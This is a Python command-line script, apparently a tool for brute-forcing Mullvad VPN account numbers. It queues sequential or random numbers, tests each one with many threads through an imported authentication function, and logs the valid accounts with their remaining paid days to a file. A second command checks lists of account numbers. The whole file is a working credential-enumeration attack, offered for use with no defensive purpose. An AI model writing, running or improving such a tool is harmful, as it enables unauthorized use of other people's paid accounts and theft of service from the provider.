#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, os, sys
from Queue import Queue
from authModule import auth
import threading
import click
from random import randint

queue = Queue()
print_lock = threading.Lock()
CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.group(context_settings=CONTEXT_SETTINGS)
def cli():
	"""This is a simple python script to scrape Mullvad.net accounts.
	Use with caution, this software is released as is under the WTFPL."""
	pass

@click.option('-t', '--threads', required=True, type=click.INT, help='Number of threads.')
@click.option('-a', '--accounts', required=True, type=click.INT, help='Number of accounts.')
@click.option('-s', '--start', default=0, type=click.INT, help='Number to start from.')
@click.option('-r', '--random', type=click.IntRange(1, 15), help='Randomize number to check.')
@click.option('-o', '--output', required=False, type=click.File('a'), help='Output file.')
@cli.command(context_settings=CONTEXT_SETTINGS)
def scrape(accounts, threads, start, random, output):
	"""Scrape Mullvad accounts."""
	starttime = time.time()
	for x in range(accounts):
		if random:
			queue.put(random_with_N_digits(random))
		else:
			queue.put(start+x)

	for i in range(threads):
		worker = threading.Thread(target=Worker, args=(queue, output))
		worker.setDaemon(True)
		worker.start()

	queue.join()
	click.secho('Finished in %ss' % round((time.time()-starttime), 2), fg='yellow')

@cli.command(context_settings=CONTEXT_SETTINGS)
@click.argument('input', type=click.File('r'))
@click.option('-t', '--threads', required=True, type=click.INT, help='Number of threads.')
@click.option('-o', '--output', required=False, type=click.File('a'), help='Output file.')
def check(input, threads, output):
	"""Check accounts in a file.

	Example usage:
	python mullvad.py check accounts.txt"""
	starttime = time.time()
	for line in input:
		queue.put(line.replace("\n", ""))

	for i in range(threads):
		worker = threading.Thread(target=Worker, args=(queue, output))
		worker.setDaemon(True)
		worker.start()

	queue.join()
	click.secho('Finished in %ss' % round((time.time()-starttime), 2), fg='yellow')

def DoWork(account, output):
	try:
		authresponse = auth(account)
	except requests.Timeout:
		with print_lock:
	 		click.secho('Request timed out.', fg='red')
	 		os._exit(666)
	if authresponse:
		with print_lock:
			click.secho('Account %s has %s days left.' % (account, authresponse.split()[5]), fg='green')
			if output:
				click.echo('Account %s has %s days left.' % (account, authresponse.split()[5]), file=output)


def Worker(q, o):
	while True:
		account = q.get()
		DoWork(account, o)
		q.task_done()

def random_with_N_digits(n):
	range_start = 10**(n-1)
	range_end = (10**n)-1
	return randint(range_start, range_end)

if __name__ == '__main__':
	cli()